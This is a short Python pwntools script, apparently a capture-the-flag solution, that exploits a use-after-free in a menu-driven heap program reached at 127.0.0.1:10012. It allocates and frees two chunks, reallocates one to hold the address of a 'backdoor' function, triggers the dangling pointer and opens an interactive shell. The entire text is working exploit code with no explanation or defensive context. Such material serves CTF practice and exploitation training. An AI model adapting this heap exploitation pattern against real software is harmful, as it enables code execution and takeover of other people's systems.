from pwn import *

# r = process('../uaf/share/uaf')
r = remote('127.0.0.1', 10012)

def add(size, data):
    r.sendlineafter(': ', '1')
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', data)

def delete(idx):
    r.sendlineafter(': ', '2')
    r.sendlineafter(': ', str(idx))

def print_(idx):
    r.sendlineafter(': ', '3')
    r.sendlineafter(': ', str(idx))

backdoor = 0x00000000004015c8

add(0x20, 'aaaa') # 0
add(0x20, 'bbbb') # 1
delete(0)
delete(1)
add(0x10, p64(backdoor))
print_(0)
r.interactive()
